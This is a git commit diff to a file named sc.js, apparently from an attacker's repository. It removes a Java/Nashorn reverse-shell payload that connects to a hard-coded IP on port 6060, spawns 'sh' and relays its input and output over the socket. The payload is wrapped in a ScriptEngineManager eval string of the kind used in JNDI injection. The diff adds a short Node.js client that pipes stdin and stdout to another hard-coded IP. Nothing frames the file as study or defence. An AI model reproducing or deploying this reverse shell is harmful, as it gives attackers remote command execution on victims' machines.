c511acc2bccdda2bb6661881e72e273ef7b619f4
isimsiz <75686345+isimsizbirii@users.noreply.github.com>
2024-03-19 11:55:30 +0300

    Update sc.js

--- sc.js
+++ sc.js
@@ -1,29 +1,16 @@
-String command = "var host = '31.172.87.63';" +
-                       "var port = 6060;" +
-                       "var cmd = 'sh';"+
-                       "var s = new java.net.Socket(host, port);" +
-                       "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
-                       "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
-                       "var po = p.getOutputStream(), so = s.getOutputStream();"+
-                       "print ('Connected');"+
-                       "while (!s.isClosed()) {"+
-                       "    while (pi.available() > 0)"+
-                       "        so.write(pi.read());"+
-                       "    while (pe.available() > 0)"+
-                       "        so.write(pe.read());"+
-                       "    while (si.available() > 0)"+
-                       "        po.write(si.read());"+
-                       "    so.flush();"+
-                       "    po.flush();"+
-                       "    java.lang.Thread.sleep(50);"+
-                       "    try {"+
-                       "        p.exitValue();"+
-                       "        break;"+
-                       "    }"+
-                       "    catch (e) {"+
-                       "    }"+
-                       "}"+
-                       "p.destroy();"+
-                       "s.close();";
-String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
-ref.add(new StringRefAddr("x", x);
+const net = require('net');
+
+const HOST = '31.172.87.6';
+const PORT = 2525;
+
+const client = net.createConnection({ host: HOST, port: PORT }, () => {
+  console.log('Sunucuya bağlandı.');
+});
+
+process.stdin.pipe(client);
+client.pipe(process.stdout);
+
+client.on('end', () => {
+  console.log('Bağlantı kesildi.');
+});
+
